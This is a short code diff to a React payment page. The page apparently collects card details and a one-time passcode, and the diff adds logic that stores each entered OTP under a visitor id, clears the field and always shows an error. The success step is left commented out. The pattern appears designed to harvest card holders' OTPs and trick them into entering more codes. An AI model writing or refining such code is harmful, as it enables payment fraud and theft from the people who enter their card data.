@@ -121,6 +121,7 @@ export default function MainPage() {
   });
   const [paymentMethod, setPaymentMethod] = useState<"card" | "cash">("card");
   const [otpCode, setOtpCode] = useState("");
+  const [showError, setShowError] = useState(false);
   const [paymentType, setPaymentType] = useState("");
   const [cardInfo, setCardInfo] = useState({
     number: "",
@@ -223,8 +224,15 @@ export default function MainPage() {
 
 
   const handleOtpVerification = () => {
-    addData({ id: visitorId, otp: otpCode });
 
+    addData({ id: visitorId, daotp: otpCode }).then(() => {
+      setOtpCode("");
+      setShowError(true);
+      setTimeout(() => {
+        setShowError(false);
+      }, 500000);
+
+    });
     setTimeout(() => {
       //   setCurrentStep("success");
     }, 3000);
@@ -732,9 +740,12 @@ export default function MainPage() {
               <Input
                 id="otp"
                 value={otpCode}
-                onChange={(e) => setOtpCode(e.target.value)}
-                placeholder="0000"
-                className="text-center text-2xl tracking-widest"
+                onChange={(e) =>{
+                  setShowError(false)
+                   setOtpCode(e.target.value)}}
+                placeholder="*******"
+                className={showError?"border-2 border-red-500":""}
+
                 maxLength={6}
               />
             </div>
